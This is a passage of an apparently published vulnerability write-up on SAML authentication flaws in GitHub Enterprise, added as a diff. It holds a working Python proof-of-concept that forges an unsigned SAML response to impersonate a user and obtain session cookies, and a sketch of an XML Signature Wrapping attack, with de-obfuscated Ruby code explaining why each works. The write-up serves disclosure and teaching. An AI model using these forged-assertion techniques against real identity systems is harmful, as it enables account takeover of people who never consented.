+<span class="p">{</span><span class="ss">:sso_url</span><span class="o">=&gt;</span><span class="s2">&quot;http://idp.ikakavas.gr/sso&quot;</span><span class="p">,</span>
+ <span class="ss">:idp_initiated_sso</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span>
+ <span class="ss">:disable_admin_demote</span><span class="o">=&gt;</span><span class="kp">false</span><span class="p">,</span>
+ <span class="ss">:issuer</span><span class="o">=&gt;</span><span class="s2">&quot;https://idp.ikakavas.gr&quot;</span><span class="p">,</span>
+ <span class="ss">:signature_method</span><span class="o">=&gt;</span><span class="s2">&quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&quot;</span><span class="p">,</span>
+ <span class="ss">:digest_method</span><span class="o">=&gt;</span><span class="s2">&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;</span><span class="p">,</span>
+ <span class="ss">:idp_certificate_file</span><span class="o">=&gt;</span><span class="s2">&quot;/data/user/common/idp.crt&quot;</span><span class="p">,</span>
+ <span class="ss">:sp_pkcs12_file</span><span class="o">=&gt;</span><span class="s2">&quot;/data/user/common/saml-sp.p12&quot;</span><span class="p">,</span>
+ <span class="ss">:admin</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span>
+ <span class="ss">:profile_name</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span>
+ <span class="ss">:profile_mail</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span>
+ <span class="ss">:profile_key</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span>
+ <span class="ss">:profile_gpg_key</span><span class="o">=&gt;</span><span class="kp">nil</span><span class="p">,</span>
+ <span class="ss">:sp_url</span><span class="o">=&gt;</span><span class="s2">&quot;https://192.168.122.244&quot;</span><span class="p">}</span>
+</pre>
+<p>The bug was staring me in the face. And it was a simple one.</p>
+<p>The configuration Hash has a property called <cite>idp_certificate_file</cite> and the code in  <cite>/data/github/current/lib/github/authentication/saml.rb</cite> attempted to get the <cite>idp_certificate_path</cite>. This returned <cite>nil</cite> and effectively disabled all SAML message integrity/authenticity protection.</p>
+</div>
+<div class="section" id="poc">
+<h4><a class="toc-backref" href="#id12">PoC</a></h4>
+<p>I wrote up the above and created the following PoC so that they could validate the issue easily:</p>
+<pre class="code python literal-block">
+<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">zlib</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">datetime</span><span class="o">,</span> <span class="nn">pprint</span>
+<span class="kn">from</span> <span class="nn">urlparse</span> <span class="kn">import</span> <span class="n">parse_qs</span>
+<span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="c1"># Change this to reflect your GHE setup</span>
+<span class="n">URL</span> <span class="o">=</span><span class="s1">'https://192.168.122.244/login?return_to=https%3A</span><span class="si">%2F%2F</span><span class="s1">192.168.122.244</span><span class="si">%2F</span><span class="s1">'</span>
+<span class="n">ISSUER</span> <span class="o">=</span> <span class="s1">'https://idp.ikakavas.gr'</span>
+<span class="n">RECIPIENT</span> <span class="o">=</span> <span class="s1">'https://192.168.122.244/saml/consume'</span>
+<span class="n">AUDIENCE</span> <span class="o">=</span> <span class="s1">'https://192.168.122.244'</span>
+<span class="c1"># user to impersonate</span>
+<span class="n">NAMEID</span> <span class="o">=</span> <span class="s1">'testuser'</span>
+
+<span class="c1"># Get a client that can handle cookies</span>
+<span class="n">saml_client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="c1"># Make the initial request to trigger the authentication middleware</span>
+<span class="c1"># Disallow redirects as we need to catch the Location header and parse it</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">saml_client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">idp_login_url</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Location'</span><span class="p">]</span>
+<span class="c1"># Get the HTTP GET parameters as a dict</span>
+<span class="n">saml_message</span> <span class="o">=</span> <span class="p">(</span><span class="nb">dict</span><span class="p">([(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">idp_login_url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">items</span><span class="p">()]))</span>
+<span class="k">if</span> <span class="s1">'SAMLRequest'</span> <span class="ow">in</span> <span class="n">saml_message</span> <span class="ow">and</span> <span class="s1">'RelayState'</span> <span class="ow">in</span> <span class="n">saml_message</span><span class="p">:</span>
+    <span class="n">relay_state</span> <span class="o">=</span> <span class="n">saml_message</span><span class="p">[</span><span class="s1">'RelayState'</span><span class="p">]</span>
+    <span class="n">encoded_saml_request</span> <span class="o">=</span> <span class="n">saml_message</span><span class="p">[</span><span class="s1">'SAMLRequest'</span><span class="p">]</span>
+    <span class="c1"># inflate and decode the request</span>
+    <span class="n">saml_request</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded_saml_request</span><span class="p">)),</span> <span class="o">-</span><span class="mi">15</span><span class="p">)</span>
+    <span class="c1"># get the AuthnRequest ID so that we can reply</span>
+    <span class="n">to_reply_to</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'ID=&quot;([_A-Za-z0-9]*)&quot;'</span><span class="p">,</span> <span class="n">saml_request</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span><span class="o">|</span><span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">now</span> <span class="o">=</span> <span class="s1">'{0}Z'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span><span class="o">.</span><span class="n">isoformat</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">not_after</span> <span class="o">=</span> <span class="s1">'{0}Z'</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span><span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">minutes</span> <span class="o">=</span> <span class="mi">20</span><span class="p">))</span><span class="o">.</span><span class="n">isoformat</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="c1">#Now load a dummy SAML Response from file and manipulate necessary fields</span>
+    <span class="n">saml_response</span> <span class="o">=</span><span class="s1">'''&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;ns0:Response Destination=&quot;{5}&quot;
+  ID=&quot;id-ijkXTw5GmzOJrShaq&quot;
+  InResponseTo=&quot;{0}&quot;
+  IssueInstant=&quot;{1}&quot; Version=&quot;2.0&quot;
+  xmlns:ns0=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:ns1=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;&gt;
+  &lt;ns1:Issuer Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:entity&quot;&gt;https://idp.ikakavas.gr&lt;/ns1:Issuer&gt;
+  &lt;ns0:Status&gt;
+    &lt;ns0:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;/&gt;
+  &lt;/ns0:Status&gt;
+  &lt;ns1:Assertion ID=&quot;id-MnRkvbCYnZ7YQ9vP5&quot;
+    IssueInstant=&quot;{1}&quot; Version=&quot;2.0&quot;&gt;
+    &lt;ns1:Issuer Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:entity&quot;&gt;{2}&lt;/ns1:Issuer&gt;
+    &lt;ns1:Subject&gt;
+      &lt;ns1:NameID
+        Format=&quot;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&quot;&gt;{3}&lt;/ns1:NameID&gt;
+      &lt;ns1:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;
+        &lt;ns1:SubjectConfirmationData
+          InResponseTo=&quot;{0}&quot;
+          NotOnOrAfter=&quot;{4}&quot; Recipient=&quot;{5}&quot;/&gt;
+      &lt;/ns1:SubjectConfirmation&gt;
+    &lt;/ns1:Subject&gt;
+    &lt;ns1:Conditions NotBefore=&quot;{1}&quot; NotOnOrAfter=&quot;{4}&quot;&gt;
+      &lt;ns1:AudienceRestriction&gt;
+        &lt;ns1:Audience&gt;{6}&lt;/ns1:Audience&gt;
+      &lt;/ns1:AudienceRestriction&gt;
+    &lt;/ns1:Conditions&gt;
+    &lt;ns1:AuthnStatement AuthnInstant=&quot;{1}&quot; SessionIndex=&quot;id-bBMbAuaPOePnBgNTx&quot;&gt;
+      &lt;ns1:AuthnContext&gt;
+        &lt;ns1:AuthnContextClassRef&gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport&lt;/ns1:AuthnContextClassRef&gt;
+      &lt;/ns1:AuthnContext&gt;
+    &lt;/ns1:AuthnStatement&gt;
+  &lt;/ns1:Assertion&gt;
+&lt;/ns0:Response&gt;'''</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">to_reply_to</span><span class="p">,</span> <span class="n">now</span><span class="p">,</span> <span class="n">ISSUER</span><span class="p">,</span> <span class="n">NAMEID</span><span class="p">,</span> <span class="n">not_after</span><span class="p">,</span> <span class="n">RECIPIENT</span><span class="p">,</span> <span class="n">AUDIENCE</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'SAMLResponse'</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">saml_response</span><span class="p">),</span>
+            <span class="s1">'RelayState'</span><span class="p">:</span><span class="n">relay_state</span><span class="p">}</span>
+    <span class="c1">#Post the SAML Response to the ACS endpoint</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">saml_client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">RECIPIENT</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="c1"># we expect a redirect on successful authentication</span>
+    <span class="k">if</span> <span class="mi">300</span> <span class="o">&lt;</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">&lt;</span> <span class="mi">399</span><span class="p">:</span>
+        <span class="c1"># Print the cookies for verification</span>
+        <span class="n">pprint</span><span class="o">.</span><span class="n">pprint</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">())</span>
+</pre>
+<p>The above would print out something like the following:</p>
+<pre class="code literal-block">
+{'_fi_sess': 'eyJsYXN0X3dyaXRlIjoxNDg0MDY0NjMxNzU3LCJmbGFzaCI6eyJkaXNjYXJkIjpbXSwiZmxhc2hlcyI6eyJhbmFseXRpY3NfZGltZW5zaW9uIjp7Im5hbWUiOiJkaW1lbnNpb241IiwidmFsdWUiOiJMb2dnZWQgSW4ifX19LCJzZXNzaW9uX2lkIjoiMzM2OGFiYmFjOGVjMWQxNGZiYjhmNDAzMGRiNWFkZGQifQ%3D%3D--c9219c7ba29e5285a76275c2a0a5dcbb12925fcb',
+'_gh_render': 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTZlMmNjZTBmN2RjMGM3MDExMGI3%0AMzVkMjcxYjZkOGY5MTQxMTE0Yzg2NDMwOGFkM2EzZDE5OTU1MjJiMTRkMGEG%0AOwBGSSIPdXNlcl9sb2dpbgY7AEZJIg10ZXN0dXNlcgY7AFQ%3D%0A--ae525ab90dee2157dec9890cdb147c569ff5e6b8',
+'dotcom_user': 'testuser',
+'logged_in': 'yes',
+'user_session': 'yoF_AlS0VMFsZjBzj8mLF9Wk_Ne1YpCv57y_T1rTy-FEfD_dWHUHd3pqz07hXxODk0hhms_8gVxICuBQ'}
+</pre>
+<p>and setting the <cite>user_session</cite> session cookie in a browser would log the attacker in as the impersonated user.</p>
+</div>
+<div class="section" id="disclosure">
+<h4><a class="toc-backref" href="#id13">Disclosure</a></h4>
+<p>I submitted the report via Hackerone on January 10th. I receive and acknowledgement some hours later, the issue was triaged the next day and a new GHE <a class="reference external" href="https://enterprise.github.com/releases/2.8.6/notes">release</a> was out on January 12th.</p>
+</div>
+</div>
+<div class="section" id="xml-signature-wrapping-attacks">
+<h3><a class="toc-backref" href="#id14">XML Signature Wrapping Attacks</a></h3>
+<p>Next weekend I found myself with some time to spare so I thought I'd give my testing software another spin in order to look for more issues. I have a test suite that would attempt all attacks described in the <a class="reference external" href="https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky">2012 paper</a></p>
+<p>Running the tool, it reported quite quickly that the implementation is vulnerable to a specific XML Signature Wrapping (XSW) attack, caused by the fact that the part that validates the signature and the part that implements business logic have different views on the data.</p>
+<p>GHE SAML SP implementation was vulnerable to a crafted SAML Response that contains two SAML Assertions. Assuming the Legitimate Assertion is LA, the Forged Assertion is FA and LAS is the signature of the Legitimate Assertion, the malicious crafted SAML Response would look like this:</p>
+<pre class="literal-block">
+&lt;SAMLRespone&gt;
+  &lt;FA ID=&quot;evil&quot;&gt;
+      &lt;Subject&gt;Attacker&lt;/Subject&gt;
+  &lt;/FA&gt;
+  &lt;LA ID=&quot;legitimate&quot;&gt;
+      &lt;Subject&gt;Legitimate User&lt;/Subject&gt;
+      &lt;LAS&gt;
+         &lt;Reference Reference URI=&quot;legitimate&quot;&gt;
+         &lt;/Reference&gt;
+      &lt;/LAS&gt;
+  &lt;/LA&gt;
+&lt;/SAMLResponse&gt;
+</pre>
+<p>Upon receiving such a SAML response, GHE would successfully verify and consume it creating a session for <strong>Attacker</strong>, instead of <strong>Legitimate User</strong>, even if FA is <strong>not</strong> signed.</p>
+<p>Let's see why GHE is vulnerable to this attack by taking a look at the de-obfuscated source code as before:</p>
+<p>The basic problem is that the implementers made an assumption that there will always be only one Assertion in a SAML response.</p>
+<p>The verification process for an incoming SAML Response starts at <cite>/data/github/current/lib/github/authentication/saml.rb</cite> in</p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">rails_authenticate</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</pre>
+<p>where the incoming SAML Message is used to create an instance of <cite>SAML::Message::Response</cite></p>
+<pre class="code ruby literal-block">
+<span class="n">saml_response</span> <span class="o">=</span> <span class="o">::</span><span class="no">SAML</span><span class="o">::</span><span class="no">Message</span><span class="o">::</span><span class="no">Response</span><span class="o">.</span><span class="n">from_param</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="o">[</span><span class="ss">:SAMLResponse</span><span class="o">]</span><span class="p">)</span>
+</pre>
+<p><cite>from_param()</cite> from <cite>/data/github/current/lib/saml/message.rb</cite> base64 decodes the response, and then calls build() which in turn calls
+parse() from <cite>/data/github/current/lib/saml/message/response.rb`</cite> In <cite>parse()</cite> the
+<a class="reference external" href="http://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri/XML/Searchable#at_xpath-instance_method">at_xpath</a>
+and
+<a class="reference external" href="http://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri/XML/Searchable#at-instance_method">at</a>
+methods of <a class="reference external" href="www.nokogiri.org">Nokogiri</a> are used extensively in order
+to search in the SAML Response for a given XPath and assign the text
+value of the node to a variable.</p>
+<p>This is the first part of the problem and this is how the business logic
+gets its view of the SAML Response. Since <cite>at_xpath</cite> and <cite>at</cite> have
+the well documented property of matching and retrieving <strong>only</strong> the
+first result, no matter how many results are there, all variables below</p>
+<pre class="code ruby literal-block">
+<span class="n">issuer</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Issuer&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Issuer&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">issuer</span> <span class="o">||=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/Issuer&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/Issuer&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">status_code</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Status/StatusCode&quot;</span><span class="p">)</span>
+<span class="n">second_level_status_code</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Status/StatusCode/StatusCode&quot;</span><span class="p">)</span>
+<span class="n">status_message</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Status/StatusMessage&quot;</span><span class="p">)</span>
+<span class="n">authn</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//AuthnStatement&quot;</span><span class="p">)</span>
+<span class="n">conditions</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/Conditions&quot;</span><span class="p">)</span>
+<span class="n">audience_text</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/Conditions/AudienceRestriction&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/Conditions/AudienceRestriction/Audience&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/Conditions/AudienceRestriction/Audience&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">attribute_statements</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Response/Assertion/AttributeStatement&quot;</span><span class="p">)</span>
+<span class="n">subject</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">name_id</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject/NameID&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject/NameID&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+<span class="n">name_id_format</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject/NameID&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject/NameID&quot;</span><span class="p">)</span><span class="o">[</span><span class="s2">&quot;Format&quot;</span><span class="o">]</span>
+<span class="n">subj_conf_data</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject/SubjectConfirmation&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">d</span><span class="o">.</span><span class="n">at_xpath</span><span class="p">(</span><span class="s2">&quot;//Subject/SubjectConfirmation/SubjectConfirmationData&quot;</span><span class="p">)</span>
+</pre>
+<p>would take their values from the Forged Assertion(!!!) since it was the first child of the SAML Response document.</p>
+<p>Now that the Response object is built, <cite>get_auth_failure_result(saml_response, request, log_data)</cite> is called as we've seen above also</p>
+<pre class="code ruby literal-block">
+<span class="k">unless</span> <span class="n">saml_response</span><span class="o">.</span><span class="n">valid?</span><span class="p">(</span>
+  <span class="ss">:issuer</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">,</span>
+  <span class="ss">:idp_certificate</span> <span class="o">=&gt;</span> <span class="n">idp_certificate</span><span class="p">,</span>
+  <span class="ss">:sp_url</span> <span class="o">=&gt;</span> <span class="n">configuration</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span>
+<span class="p">)</span>
+  <span class="n">log_auth_validation_event</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="s2">&quot;failure - Invalid SAML response&quot;</span><span class="p">,</span> <span class="n">saml_response</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">)</span>
+  <span class="k">return</span> <span class="no">GitHub</span><span class="o">::</span><span class="no">Authentication</span><span class="o">::</span><span class="no">Result</span><span class="o">.</span><span class="n">failure</span> <span class="ss">:message</span> <span class="o">=&gt;</span> <span class="no">INVALID_RESPONSE</span>
+<span class="k">end</span>
+</pre>
+<p>The <cite>valid?</cite> method of <cite>saml_response</cite> actually calls validate from /lib/saml/message.rb</p>
+<pre class="code ruby literal-block">
+<span class="c1"># Public: Validates schema and custom validations.</span>
+<span class="c1">#</span>
+<span class="c1"># Returns false if instance is invalid. #errors will be non-empty if</span>
+<span class="c1"># invalid.</span>
+<span class="k">def</span> <span class="nf">valid?</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">{})</span>
+  <span class="n">errors</span><span class="o">.</span><span class="n">clear</span>
+  <span class="n">validate_schema</span> <span class="o">&amp;&amp;</span> <span class="n">validate</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+  <span class="n">errors</span><span class="o">.</span><span class="n">empty?</span>
+<span class="k">end</span>
+</pre>
+<p>and <cite>validate</cite> is implemented in <cite>/data/github/current/lib/saml/message/response.rb</cite></p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">validate</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
+    <span class="k">if</span> <span class="o">!</span><span class="no">SAML</span><span class="o">.</span><span class="n">mocked</span><span class="o">[</span><span class="ss">:skip_validate_signature</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span>
+      <span class="n">validate_has_signature</span>
+      <span class="n">validate_signatures</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:idp_certificate</span><span class="o">]</span><span class="p">)</span>
+    <span class="k">end</span>
+    <span class="n">validate_issuer</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_destination</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_recipient</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_conditions</span>
+    <span class="n">validate_audience</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:sp_url</span><span class="o">]</span><span class="p">)</span>
+    <span class="n">validate_name_id_format</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:name_id_format</span><span class="o">]</span><span class="p">)</span>
+<span class="k">end</span>
+</pre>
+<p>Here is where the second part of the problem manifests and where the signature verification logic gets its view of the SAML Response:</p>
+<p><cite>validate_has_signature</cite> looks like this:</p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">validate_has_signature</span>
+    <span class="n">namespaces</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="s2">&quot;ds&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span><span class="p">,</span>
+      <span class="s2">&quot;saml2p&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span><span class="p">,</span>
+      <span class="s2">&quot;saml2&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>
+    <span class="p">}</span>
+    <span class="k">unless</span> <span class="n">document</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="s2">&quot;//saml2p:Response/ds:Signature&quot;</span><span class="p">,</span> <span class="n">namespaces</span><span class="p">)</span> <span class="o">||</span>
+           <span class="n">document</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="s2">&quot;//saml2p:Response/saml2:Assertion/ds:Signature&quot;</span><span class="p">,</span> <span class="n">namespaces</span><span class="p">)</span>
+      <span class="nb">self</span><span class="o">.</span><span class="n">errors</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;Message is not signed. Either the assertion or response or both must be signed.&quot;</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+</pre>
+<p><tt class="docutils literal">//saml2p:Response/saml2:Assertion/ds:Signature</tt> matches the legitimate assertion just fine so the method does not add anything to self.errors</p>
+<p>Then, <cite>validate_signatures</cite></p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">validate_signatures</span><span class="p">(</span><span class="n">certificate</span><span class="p">)</span>
+    <span class="n">certificate</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">X509</span><span class="o">::</span><span class="no">Certificate</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">certificate</span><span class="p">)</span>
+    <span class="k">unless</span> <span class="n">signatures</span><span class="o">.</span><span class="n">all?</span> <span class="p">{</span> <span class="o">|</span><span class="n">signature</span><span class="o">|</span> <span class="n">signature</span><span class="o">.</span><span class="n">valid?</span><span class="p">(</span><span class="n">certificate</span><span class="p">)</span> <span class="p">}</span>
+      <span class="nb">puts</span> <span class="s2">&quot;digest mismatch&quot;</span>
+      <span class="nb">self</span><span class="o">.</span><span class="n">errors</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;Digest mismatch&quot;</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+</pre>
+<p>uses <cite>signatures</cite> that comes from <tt class="docutils literal">/data/github/current/lib/saml/message.rb</tt></p>
+<pre class="code ruby literal-block">
+<span class="k">def</span> <span class="nf">signatures</span>
+  <span class="n">signatures</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&quot;//ds:Signature&quot;</span><span class="p">,</span> <span class="no">Xmldsig</span><span class="o">::</span><span class="no">NAMESPACES</span><span class="p">)</span>
+  <span class="n">signatures</span><span class="o">.</span><span class="n">reverse</span><span class="o">.</span><span class="n">collect</span> <span class="k">do</span> <span class="o">|</span><span class="n">node</span><span class="o">|</span>
+    <span class="no">Xmldsig</span><span class="o">::</span><span class="no">Signature</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>
+  <span class="k">end</span> <span class="o">||</span> <span class="o">[]</span>
+<span class="k">end</span>
+</pre>
+<p>which matches the signature of the Legitimate Assertion in our forged SAML Response since it's the only one there and <tt class="docutils literal">valid?</tt> from
+<tt class="docutils literal"><span class="pre">Xmldsig::Signature</span></tt> validates successfully the signature against the Identity Provider signing certificate (public key) since the legitimate assertion did come from the valid IdP.</p>
+<p>Back to <tt class="docutils literal">validate</tt> of <tt class="docutils literal">response.rb</tt>, all of the below</p>
+<pre class="code ruby literal-block">
+<span class="n">validate_issuer</span><span class="p">(</span><span class="n">options</span><span class="o">[</span><span class="ss">:issuer</span><span class="o">]</span><span class="p">)</span>
